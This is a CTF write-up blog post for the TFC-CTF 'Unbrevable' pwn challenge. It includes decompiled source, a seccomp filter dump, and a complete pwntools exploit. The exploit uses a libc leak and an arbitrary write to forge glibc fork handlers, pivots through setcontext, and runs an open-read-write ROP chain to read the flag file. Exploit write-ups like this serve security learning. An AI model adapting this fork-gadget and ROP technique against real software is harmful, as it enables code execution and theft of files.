---
title: "[TFC-CTF 26]-Pwn/Unbrevable"
published: 2026-09-06
description: "Fork gadget? A new attack surface less go !!"
tags: ["Fork"]
category: Pwn
---

### Overview
Last weekend, I tried TFC-CTF, and solved this challenge, which kinda demonstrated the rce using fork gadget. [0xa5h](https://0xa5h.com/pwn/fork_gadget) already wrote a cool [blog](https://0xa5h.com/pwn/fork_gadget) dictating the attack, and the challenge also had pretty much same source code.

### Source Code
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *s; // [rsp+8h] [rbp-18h] BYREF
  int n[2]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  setup_seccomp();
  printf("%p\n", &setvbuf);
  __isoc99_scanf("%zu %zu ", &s, n);
  fgets(s, n[0], stdin);
  fork();
  return 0;
}
```

This is the source code of the challenge, pretty simple. It gives use a ```setvbuf``` leak, giving us a simple ASLR bypass. Then a simple arbitrary write primtimive, and calls fork.
During CTF, I copypasta the script and seccomp is enabled so initially I tried to do ```execveat``` but failed, idk why.

```md
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0b 0xffffffff  if (A != 0xffffffff) goto 0016
 0005: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0015
 0006: 0x15 0x08 0x00 0x00000001  if (A == write) goto 0015
 0007: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0015
 0008: 0x15 0x06 0x00 0x0000000e  if (A == rt_sigprocmask) goto 0015
 0009: 0x15 0x05 0x00 0x0000000f  if (A == rt_sigreturn) goto 0015
 0010: 0x15 0x04 0x00 0x0000003c  if (A == exit) goto 0015
 0011: 0x15 0x03 0x00 0x000000e7  if (A == exit_group) goto 0015
 0012: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0015
 0013: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0015
 0014: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL

```
So I yoinked setcontext script, and I noticed the stack is libc address, and I can write on it, so when any function returns, we can do open-read-write rop chain.
```python
from pwn import *

elf = context.binary = ELF("./vuln_patched")
context.log_level = "debug"
libc = ELF("./libc.so.6")
# io = process()
REMOTE = "unbrevable-unbrevable-f2dec2d27c15629d.challs.ctf.thefewchosen.com"
PORT = 1337
io = remote(REMOTE, PORT, ssl=True)

gs = """
# break *0x00005555555554d3
# break gets
# break *0x7ffff7ceaf46
break *0x7ffff7c53b2e
break *0x7ffff7c80f82
"""
# gdb.attach(io, gdbscript=gs)


fgets = int(io.recvline(), 16)
log.info(f"fgets: {hex(fgets)}")

libc.address = fgets - 0x815F0
log.info(f"libc: {hex(libc.address)}")


def setcontext(regs, addr):
  frame = SigreturnFrame()
  for reg, val in regs.items():
    setattr(frame, reg, val)
  # needed to prevent SEGFAULT
  setattr(frame, "&fpstate", addr + 0x1A8)
  fpstate = {
    0x00: p16(0x37F),  # cwd
    0x02: p16(0xFFFF),  # swd
    0x04: p16(0x0),  # ftw
    0x06: p16(0xFFFF),  # fop
    0x08: 0xFFFFFFFF,  # rip
    0x10: 0x0,  # rdp
    0x18: 0x1F80,  # mxcsr
  }
  return flat(
    {
      0x00: bytes(frame),
      # 0xf8: 0					# end of SigreturnFrame
      0x128: 0,  # uc_sigmask
      0x1A8: fpstate,  # fpstate
    }
  )


def header(addr, size):
  return flat({0x00: size, 0x10: addr})


def handler_array(*funcs):
  assert funcs
  data = bytearray(0x20 * len(funcs) - 0x18)
  for i, func in zip(range(0, len(data), 0x20), funcs[::-1]):
    data[i : i + 8] = p64(func)
  return data


def forge_split(addr, *funcs, rdi=None):
  array = handler_array(*funcs)
  if rdi is not None:
    size = rdi
    assert size >= len(funcs)
    addr = (addr - (size - len(funcs)) * 0x20) % (1 << 64)
  else:
    size = len(funcs)
  return header(addr, size), array


def forge(addr, *funcs, rdi=None):
  hdr, arr = forge_split(addr + 0x18, *funcs, rdi=rdi)
  return hdr + arr


addr = libc.sym.fork_handlers

addr_ctx = addr + 0x100
data = forge(
  addr,
  libc.sym.gets,
  libc.address + 0x00000000000A8558,
  libc.sym.__memset_erms + 13,
  libc.sym.setcontext + 45,
  rdi=addr_ctx,
)
assert b"\n" not in data

flag = libc.address + 0x221DA8
extra_data = setcontext(
  {
    "rdi": libc.address + 0x221DA8,
    "rsi": 0x0,
    "rdx": 0x0,
    "rip": libc.sym.puts,
    "rsp": addr_ctx + 0x200,
  },
  addr_ctx,
)
assert b"\n" not in extra_data

###########3rop
open_addr = libc.sym["open"]
read_addr = libc.sym["read"]
write_addr = libc.sym["write"]
rop = ROP(libc)

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
# pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
pop_rdx_rbx = libc.address + 0x00000000000904A9

ret = rop.find_gadget(["ret"]).address

xchg_rax_rdi = libc.address + 0x000000000014A1B5
buf = libc.bss() + 0x600


extra_data += b"./flag\x00\x00"
extra_data += pack(0xDEADBEEF)
extra_data += pack(ret) * 0x10


#######33payload###########333

# open("./flag", O_RDONLY)

payload = p64(pop_rdi)
payload += p64(flag)

payload += p64(pop_rsi)
payload += p64(0)

payload += p64(open_addr)

# RAX = fd
# Move fd -> RDI
payload += p64(xchg_rax_rdi)

# read(fd, buf, 0x100)
payload += p64(pop_rsi)
payload += p64(buf)

payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += pack(0x0)

payload += p64(read_addr)

# write(1, buf, 0x100)
payload += p64(pop_rdi)
payload += p64(1)

payload += p64(pop_rsi)
payload += p64(buf)

payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += pack(0x0)

payload += p64(write_addr)

extra_data += payload

io.sendline(f"{addr} {len(data) + 2} ".encode() + data)
io.sendline(extra_data)

io.interactive()
```

### Aftermath
Pretty fun challenge, new attack surface exploration is always exciting!
